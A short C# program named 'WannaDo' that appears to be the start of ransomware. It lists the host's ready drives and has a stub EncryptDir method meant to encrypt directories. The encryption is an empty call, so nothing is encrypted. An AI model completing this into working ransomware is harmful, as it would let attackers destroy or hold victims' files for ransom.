using System;
using System.Collections.Generic;
using System.IO;

namespace WannaDo
{
    class Program
    {
        static List<string> DiskLetters = new List<string>();
        private static void CurrentDrives()
        {
            //get all disk letter in the host
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                if (d.IsReady == true)
                {
                    Console.WriteLine(d.Name);
                    DiskLetters.Add(d.Name);
                }
                else Console.WriteLine("ready disk not found");
            }
        }
        private static bool Check_Disks(string DiskLetter)
        {
            //check if disk is ready or not
            DriveInfo drive = new DriveInfo(DiskLetter);
            bool isReady = drive.IsReady;
            Console.WriteLine($"disk ready: {isReady.ToString().ToLower()}");
            return isReady;
        }

        private static void EncryptDir()
        {
            //encrypt directory and subdirectory files
            Cryptography crypto = new Cryptography();
            crypto.EncryptFile("","");
        }

        static void Main(string[] args)
        {

            
            CurrentDrives();
        }
    }
}
